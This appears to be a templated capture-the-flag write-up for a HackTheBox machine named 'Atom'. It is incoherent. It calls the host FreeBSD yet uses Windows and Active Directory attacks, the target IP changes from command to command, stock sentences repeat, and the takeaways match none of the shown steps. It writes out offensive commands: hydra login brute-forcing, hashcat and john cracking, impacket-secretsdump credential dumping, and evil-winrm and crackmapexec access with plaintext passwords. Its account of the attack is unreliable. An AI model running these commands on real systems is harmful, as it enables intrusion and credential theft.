---
TitleSEO: "HackTheBox — Atom (Hard FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Atom (Hard FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Atom. Pass the Ticket and DCSync to achieve hard compromise on FreeBSD."
Keywords: "windows, tryhackme, active directory, linux"
URL: "https://zurefx.github.io/writeups/htb-atom-526.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-atom-526/"
Date: "2024-11-30"
Tags: "Windows, TryHackMe, Active Directory, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-atom-526"
Permalink: "/writeups/htb-atom-526.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Atom** is rated **Hard** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.49.146.249`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.13.253.26 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.62.189.69 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.135.173 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.220.239/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

Key finding: **Pass the Ticket**.

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.243.70
evil-winrm -i 10.99.139.92 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.56.240.216 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.79.131.162 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.116.149.138 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `lookupsid`
- `nmap`
- `psexec`
- `burpsuite`
- `ligolo-ng`
- `netcat`
- `socat`
- `metasploit`

### Key Takeaways

- Pass the Ticket
- DCSync
- LXD Privilege Escalation
